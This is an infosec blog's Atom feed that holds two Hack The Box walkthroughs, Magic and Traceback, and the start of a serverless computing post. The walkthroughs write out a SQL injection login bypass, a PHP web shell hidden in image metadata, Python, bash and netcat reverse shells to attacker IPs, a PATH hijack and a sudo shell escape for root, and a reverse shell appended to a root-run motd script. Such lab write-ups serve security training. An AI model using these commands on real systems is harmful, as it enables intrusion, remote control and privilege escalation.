<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-08-24T02:49:02+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">r3dw0lf_sec</title><subtitle>Official r3dw0lfsec blog. Follow this blog for awesome Infosec Articles</subtitle><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><entry><title type="html">Magic Machine Walkthrough</title><link href="http://localhost:4000/blogs/hackthebox/magic.html" rel="alternate" type="text/html" title="Magic Machine Walkthrough" /><published>2020-08-23T00:00:00+05:30</published><updated>2020-08-23T00:00:00+05:30</updated><id>http://localhost:4000/blogs/hackthebox/magic</id><content type="html" xml:base="http://localhost:4000/blogs/hackthebox/magic.html">&lt;p class=&quot;lead&quot;&gt;&lt;strong&gt;&lt;em&gt;“Any sufficiently advanced technology is indistinguishable from magic.”&lt;/em&gt;&lt;/strong&gt; - Arthur C. Clarke&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/machine.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#machine-matrix&quot; id=&quot;markdown-toc-machine-matrix&quot;&gt;Machine Matrix&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#machine-summary&quot; id=&quot;markdown-toc-machine-summary&quot;&gt;Machine Summary&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#nmap-scan&quot; id=&quot;markdown-toc-nmap-scan&quot;&gt;Nmap Scan&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration-on-port-80&quot; id=&quot;markdown-toc-enumeration-on-port-80&quot;&gt;Enumeration on port 80&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#bypassing-authentication-through-sqli&quot; id=&quot;markdown-toc-bypassing-authentication-through-sqli&quot;&gt;Bypassing Authentication Through SQLI&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acquiring-initial-foothold-as-www-data&quot; id=&quot;markdown-toc-acquiring-initial-foothold-as-www-data&quot;&gt;Acquiring Initial Foothold as www-data&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acquiring-user-shell---theseus&quot; id=&quot;markdown-toc-acquiring-user-shell---theseus&quot;&gt;Acquiring User Shell - Theseus&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acquiring-root-privileges&quot; id=&quot;markdown-toc-acquiring-root-privileges&quot;&gt;Acquiring Root Privileges&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;machine-matrix&quot;&gt;Machine Matrix&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/matrix.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;machine-summary&quot;&gt;Machine Summary&lt;/h2&gt;
&lt;p&gt;Box is a linux machine that has a webserver running whose authentication can be bypassed through SQL Injection. There is a file upload functionality that can be bypassed which grants the low privileged shell. There is a php file which has stored credentials for mysqlservice, we can get the user credentials through accessing the tables. Replacing the fdisk file malicious file (reverse shell) and adding the path grants the root privilege as sysinfo binary indirectly pulls fdisk.&lt;/p&gt;

&lt;h2 id=&quot;nmap-scan&quot;&gt;Nmap Scan&lt;/h2&gt;
&lt;p&gt;I started the enumeration with nmap scan&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.10.185
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/nmap.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The box had two ports open&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Port&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Service&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SSH&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apache&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;enumeration-on-port-80&quot;&gt;Enumeration on port 80&lt;/h2&gt;
&lt;p&gt;I ran dirbuster that revealed a folder /images/uploads but it was forbidden&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But the contents and files of the folder can be accessed&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I guessed the inital foothold path i.e i need to find a way to upload a file ( that contains the shell code) and trigger it. I started enumerating on the web application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;bypassing-authentication-through-sqli&quot;&gt;Bypassing Authentication Through SQLI&lt;/h2&gt;
&lt;p&gt;Application had a login page and the authentication can be bypassed through SQL Injection.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'or'1'='1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;There is a upload functionality so i tried to put a webshell but i wasn’t able to directly upload it. I also tried to bypass upload restrictions through changing the extension of the file to .php.png and content type from application to image/png but that also failed.&lt;/p&gt;

&lt;h2 id=&quot;acquiring-initial-foothold-as-www-data&quot;&gt;Acquiring Initial Foothold as www-data&lt;/h2&gt;
&lt;p&gt;Upon researching a bit, i found a way to add a malicious code (web-shell) to meta data of a image file through using exif tool.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exiftool &lt;span class=&quot;nt&quot;&gt;-Comment&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;?php echo &quot;&amp;lt;pre&amp;gt;&quot;; system($_GET['&lt;/span&gt;cmd&lt;span class=&quot;s1&quot;&gt;']); ?&amp;gt;'&lt;/span&gt; file.jpg &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;file.jpg file.php.jpg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Upon loading the file on browser, it looks like crap.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Upon viewing on Burp, it made sense.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In order to get a proper reverse shell, i decided to upload a php reverse shell and triger that&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;PORT&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I started the listener on my attacking machine&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;PORT&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I got the initial foothold as www-data.&lt;/p&gt;

&lt;h2 id=&quot;acquiring-user-shell---theseus&quot;&gt;Acquiring User Shell - Theseus&lt;/h2&gt;

&lt;p&gt;Upon enumerating the directories i found a juicy file &lt;strong&gt;db.php&lt;/strong&gt; in the directory &lt;strong&gt;/var/www/Magic&lt;/strong&gt;. The file had credentials of the user &lt;strong&gt;theseus&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dbUsername = theseus
dbPassword = iamkingtheseus
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried to login over MySQL Service and SSH but both failed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Upon researching a bit got to know about the command &lt;strong&gt;mysqldump&lt;/strong&gt; that is used to backup, restore and dump the database.&lt;/p&gt;

&lt;p&gt;I used that to dump the entire Magic database&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysqldump &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; theseus &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Magic
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I got a new set of credentials for the user theseus&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username: admin
password: Th3s3usW4sK1ng
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I tried to login into the theseus account using the obtained password over ssh. I got the user shell&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acquiring-root-privileges&quot;&gt;Acquiring Root Privileges&lt;/h2&gt;
&lt;p&gt;I ran linPeas that gave some information, sysinfo belongs to the root but can be executed by the user theseus. I executed the sysinfo command, it displayed more information then a normal sysinfo command would. After researching a bit, I found that information that gets revealed while executing fdisk command also revealed while executing sysinfo in the machine. &lt;strong&gt;binary fdisk is getting executed indirectly when sysinfo is executed&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I created a python script that would grant me the reverse shell with the name &lt;strong&gt;fdisk&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.54&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I downloaded the file in the victim machine at tmp directory but when sysinfo gets executed fdisk in the bin directory gets executed. so i need to set the path to tmp directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I started the listener in my attacker machine and again executed sysinfo, fdisk in the /tmp/ directory got executed and i got the reverse shell with root privileges.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/pwned.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Happy Hacking !&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="Hackthebox" /><summary type="html">“Any sufficiently advanced technology is indistinguishable from magic.” - Arthur C. Clarke</summary></entry><entry><title type="html">Traceback Machine Walkthrough</title><link href="http://localhost:4000/blogs/hackthebox/traceback.html" rel="alternate" type="text/html" title="Traceback Machine Walkthrough" /><published>2020-08-15T00:00:00+05:30</published><updated>2020-08-15T00:00:00+05:30</updated><id>http://localhost:4000/blogs/hackthebox/traceback</id><content type="html" xml:base="http://localhost:4000/blogs/hackthebox/traceback.html">&lt;p class=&quot;lead&quot;&gt;&lt;strong&gt;&lt;em&gt;“Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete.”&lt;/em&gt;&lt;/strong&gt; - Chanda Kochhar&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/machine.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#machine-matrix&quot; id=&quot;markdown-toc-machine-matrix&quot;&gt;Machine Matrix&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#machine-summary&quot; id=&quot;markdown-toc-machine-summary&quot;&gt;Machine Summary&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#nmap-scan&quot; id=&quot;markdown-toc-nmap-scan&quot;&gt;Nmap Scan&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration-on-port-80&quot; id=&quot;markdown-toc-enumeration-on-port-80&quot;&gt;Enumeration on port 80&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acquiring-initial-foothold-webadmin&quot; id=&quot;markdown-toc-acquiring-initial-foothold-webadmin&quot;&gt;Acquiring Initial Foothold (Webadmin)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acquiring-user-shell-sysadmin&quot; id=&quot;markdown-toc-acquiring-user-shell-sysadmin&quot;&gt;Acquiring User Shell (Sysadmin)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acquiring-root-shell&quot; id=&quot;markdown-toc-acquiring-root-shell&quot;&gt;Acquiring Root Shell&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;machine-matrix&quot;&gt;Machine Matrix&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/matrix.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;machine-summary&quot;&gt;Machine Summary&lt;/h2&gt;
&lt;p&gt;Box is a linux machine that has a webserver running which is backdoored with a webshell. Upon getting the shell with webadmin access, privilege escalation to sysadmin can be done with misconfigured permissions of executing &lt;strong&gt;luvit&lt;/strong&gt; i.e luvit can be executed as sysadmin without the password. On a successfull login onto the ssh, /etc/update-motd.d/ gets executed with root privilege, rewritting a file in it with reverse shell would grant us the root privilege.&lt;/p&gt;

&lt;h2 id=&quot;nmap-scan&quot;&gt;Nmap Scan&lt;/h2&gt;
&lt;p&gt;I started the enumeration with nmap scan&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.10.181
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The box had two ports open
| Port         | Service           |
|:————-|:——————|
| 22           | SSH               |
| 80           | Apache            |&lt;/p&gt;

&lt;h2 id=&quot;enumeration-on-port-80&quot;&gt;Enumeration on port 80&lt;/h2&gt;
&lt;p&gt;I started to enumerate on the webserver, it said “This site has been owned I have left a backdoor for all the net. FREE INTERNETZZZ -Xh4H- “&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Viewing the source of the page gave me a hint about the web shells, so i went on to search about Xh4H related to webshells on google&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acquiring-initial-foothold-webadmin&quot;&gt;Acquiring Initial Foothold (Webadmin)&lt;/h2&gt;
&lt;p&gt;I found the web-shells repository of Xh4H, i tried putting all the web-shells in the repository on the url (http://10.10.10.181)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At last, found that smevk.php is the web-shell that has been backdoored on the machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The webshell has username and password as “admin” that i found on viewing the source of the webshell smevk.php&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To grant me the full fleged shell, i decided to upload a bash script that could grant me a proper shell&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;PORT&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acquiring-user-shell-sysadmin&quot;&gt;Acquiring User Shell (Sysadmin)&lt;/h2&gt;
&lt;p&gt;I have the shell as webadmin, now i need to enumerate and esaclate my privileges to a user. Upon enumeration, i found that no password is required to execute /home sysadmin/luvit using the command&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Upon googling some time, i made a command that can grant me a shell as sysadmin&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; sysadmin /home/sysadmin/luvit &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'os.execute(&quot;/bin/sh&quot;)'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I got the user, moving on to the getting the root&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now i started to enumerate on the privileges of sysadmin that can be the way for root privilege escalation. Manual enumeration didnt work it out for me, so i ran linpeas but that also didnt work out. So i decided to monitor the processes that are running using pspy. I added my ssh public key in the on sysadmin/.ssh authorized_keys and transfered the pspy64 to the machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acquiring-root-shell&quot;&gt;Acquiring Root Shell&lt;/h2&gt;
&lt;p&gt;I found that /etc/update-motd.d/ gets modified and executed each time when a user logs in through ssh&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I also confirmed that /etc/update-motd.d/ has files that are writable by the user sysadmin&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find /etc &lt;span class=&quot;nt&quot;&gt;-writable&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I enumerated on the directory it had 4 files&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/etc/update-motd.d/10-help-text
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/00-header
/etc/update-motd.d/80-esm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I decided to have a bash script on /etc/update-motd.d/00-header so i added rev-shell using the command&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/{IP}/{PORT} 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/update-motd.d/00-header 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now i logged on to ssh in a new tab with a listener on other tab hopping to get reverse connection but that didnt worked out. Upon researching i found that the modification that we made to the file isn’t properly getting safed.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;rm /tmp/m;mkfifo /tmp/m;cat /tmp/m|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.158 9090 &amp;gt; /tmp/m&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/update-motd.d/00-header
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I got the reverse shell with root privileges&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/pwned.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="Hackthebox" /><summary type="html">“Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete.” - Chanda Kochhar</summary></entry><entry><title type="html">Serverless Computing in a Nutshell</title><link href="http://localhost:4000/blogs/cloudsecurity/serverless.html" rel="alternate" type="text/html" title="Serverless Computing in a Nutshell" /><published>2020-08-10T00:00:00+05:30</published><updated>2020-08-10T00:00:00+05:30</updated><id>http://localhost:4000/blogs/cloudsecurity/serverlesscomputing</id><content type="html" xml:base="http://localhost:4000/blogs/cloudsecurity/serverless.html">&lt;p class=&quot;lead&quot;&gt;Most of the Serverless architecture are built with a motto of &lt;strong&gt;&lt;em&gt;“Focus on the application, not the infrastructure and maintenance”&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#what-is-serverless-&quot; id=&quot;markdown-toc-what-is-serverless-&quot;&gt;What is serverless ?&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#popular-serverless-computing-providers&quot; id=&quot;markdown-toc-popular-serverless-computing-providers&quot;&gt;Popular Serverless Computing Providers&lt;/a&gt;&lt;/li&gt;
